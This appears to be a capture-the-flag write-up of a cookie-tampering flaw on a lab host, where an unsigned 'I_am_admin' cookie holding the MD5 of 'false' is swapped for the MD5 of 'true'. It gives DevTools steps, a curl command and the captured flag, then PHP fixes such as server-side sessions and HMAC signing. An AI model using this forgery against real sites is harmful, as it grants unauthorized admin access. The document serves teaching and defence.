# Cookie Tampering / Insecure Session — Documentation

## How I Found It

**Initial reconnaissance:**
- Opened DevTools → Application → Cookies
- Found suspicious cookie: `I_am_admin=68934a3e9455fa72420237eb05902327`
- Hypothesis: Server trusts client-side cookie value
- Cookie appears to be MD5 hash of a boolean value

## How I Exploited It

**Identify hash type:**
```bash
# Test common values
echo -n "false" | md5sum
# Output: 68934a3e9455fa72420237eb05902327  ← matches!

echo -n "true" | md5sum
# Output: b326b5062b2f0e69046810717534cb09
```

**Exploit steps:**

1. **Open DevTools** → Application → Cookies
2. **Find cookie:** `I_am_admin=68934a3e9455fa72420237eb05902327`
3. **Replace value with:** `b326b5062b2f0e69046810717534cb09`
4. **Refresh page** → Flag revealed

**Alternative with curl:**
```bash
curl -b "I_am_admin=b326b5062b2f0e69046810717534cb09" \
  http://192.168.1.16/
```

**Flag obtained:**
```
df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
```

## Why It Works

**Vulnerabilities:**
1. **Client-side trust** → Server trusts cookie sent by client
2. **Predictable hash** → MD5 of simple value ("true"/"false")
3. **No signing** → No HMAC or verification of cookie integrity
4. **No server-side session** → State stored entirely in cookie

## How to Fix It

**Immediate fixes:**

1. **Server-side sessions:**
```php
// Don't trust client cookies for authorization
session_start();
if ($_SESSION['is_admin'] === true) {
    // grant access
}
```

2. **Sign cookies with HMAC:**
```php
// Create
$value = "true";
$signature = hash_hmac('sha256', $value, SECRET_KEY);
$cookie = $value . "." . $signature;
setcookie("auth", $cookie, [...], true, true); // HttpOnly, Secure

// Verify
list($value, $sig) = explode(".", $_COOKIE['auth']);
if (hash_hmac('sha256', $value, SECRET_KEY) !== $sig) {
    die("Invalid cookie");
}
```

3. **Use HttpOnly & Secure flags:**
```php
setcookie("auth", $value, [
    'httponly' => true,  // Prevents JS access
    'secure' => true,    // HTTPS only
    'samesite' => 'Lax'  // CSRF protection
]);
```

**Long-term improvements:**

1. **Opaque session IDs** (random tokens stored server-side)
2. **Bind sessions to user/IP**
3. **Session expiration & rotation**
4. **Monitor for suspicious cookie values**

**Testing:**
```bash
# Should fail after fixes
curl -b "I_am_admin=b326b5062b2f0e69046810717534cb09" http://192.168.1.16/
```

## References

- OWASP Session Management Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- CWE-565: Reliance on Cookies without Validation — https://cwe.mitre.org/data/definitions/565.html
```